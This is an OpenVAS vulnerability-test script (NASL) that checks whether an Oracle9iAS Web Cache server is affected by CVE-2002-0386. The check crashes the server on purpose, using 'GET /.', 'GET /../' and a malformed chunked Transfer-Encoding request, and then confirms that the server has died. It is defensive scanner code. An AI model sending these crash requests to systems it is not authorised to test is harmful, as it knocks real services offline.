# OpenVAS Vulnerability Test
# $Id: oracle9iAS_slashdot_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Oracle webcache admin interface DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the web server by
requesting '/.' or '/../', or sending an invalid request
using chunked content encoding

A cracker may exploit this vulnerability to make your web server
crash continually.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# From: "@stake advisories" <advisories@atstake.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 28 Oct 2002 13:30:54 -0500
# Subject: Oracle9iAS Web Cache Denial of Service (a102802-1)
#
# http://www.atstake.com/research/advisories/2002/a102802-1.txt
# http://otn.oracle.com/deploy/security/pdf/2002alert43rev1.pdf
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0

if(description)
{
 script_id(11076);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3765, 5902);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2002-0386");
 name = "Oracle webcache admin interface DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Invalid web requests crash Oracle webcache admin";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 4000);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########

include("http_func.inc");
include("misc_func.inc");

function check(port)
{
  local_var	soc, r;

 if (http_is_dead(port: port)) return;
 banner = get_http_banner(port:port);
 if(!banner)return;
 if("OracleAS-Web-Cache" >!< banner)return;

 soc = http_open_socket(port);
  if(! soc) return;

 # The advisory says "GET /. HTTP/1.0" - however this won't get
 # past some transparent proxies, so it's better to use http_get()
 
 r = http_get(port: port, item: "/.");
  send(socket:soc, data: r);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  soc = http_open_socket(port);
  if(soc)
  {
    r = http_get(port: port, item: "/../");
 send(socket:soc, data: r);
 r = http_recv(socket:soc);
 http_close_socket(soc);

    soc = http_open_socket(port);
    if(soc)
    {
      r = http_get(port: port, item: "/");
      r = r - '\r\n';
      r = strcat(r, 'Transfer-Encoding: chunked\r\n\r\n');
      send(socket:soc, data: r);
      r = http_recv(socket:soc);
      http_close_socket(soc);
    }
  }
 sleep(1); # Is it really necessary ?
 if(http_is_dead(port:port))security_warning(port);
 return;
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:4000);
foreach port (ports) check(port: port);

